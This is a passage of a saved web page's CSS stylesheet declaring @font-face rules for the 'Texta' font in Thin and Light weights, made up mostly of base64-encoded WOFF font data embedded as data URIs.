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) format('woff'), /* Modern Browsers */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.ttf*/ url() format('truetype'), /* Safari, Android, iOS */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.svg#Texta-Light*/ url() format('svg'); /* Legacy iOS */
    font-style: normal;
    font-weight: 200;
    text-rendering: optimizeLegibility;
}
/* END Thin */



/* BEGIN Light */
/*
@font-face {
    font-family: 'Texta';
    src: url("/risorseweb/poste_it/risorseweb/poste_it/risorse_dt/condivise/fonts/texta/Texta-Light.otf");
    font-style: normal;
    font-weight: 200;
}
*/

@font-face {
    font-family: 'Texta';
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.eot*/ url(); /* IE9 Compat Modes */
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.eot?#iefix*/ url() format('embedded-opentype'), /* IE6-IE8 */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.woff*/ url(data:application/font-woff;base64,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